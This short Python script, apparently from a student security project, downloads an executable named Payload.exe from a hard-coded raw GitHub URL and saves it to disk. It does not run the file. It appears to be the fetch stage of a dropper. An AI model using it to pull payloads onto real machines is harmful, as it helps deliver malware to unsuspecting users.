import requests
import time

# Be carefull to use the RAW url. example:
# https://github.com/WannesDH-2261159/BNS_BN_22/blob/main/Payload.exe
# becomes https://raw.githubusercontent.com/WannesDH-2261159/BNS_BN_22/main/Payload.exe

payloadURL = "https://raw.githubusercontent.com/WannesDH-2261159/BNS_BN_22/main/Payload.exe"
outputFile = "Payload.exe"

r = requests.get(payloadURL)

if r.status_code == 200:
    with open(outputFile, "wb") as f:
        f.write(r.content)
    print("File downloaded successfully")
else:
    print("Failed to download file:", r.status_code)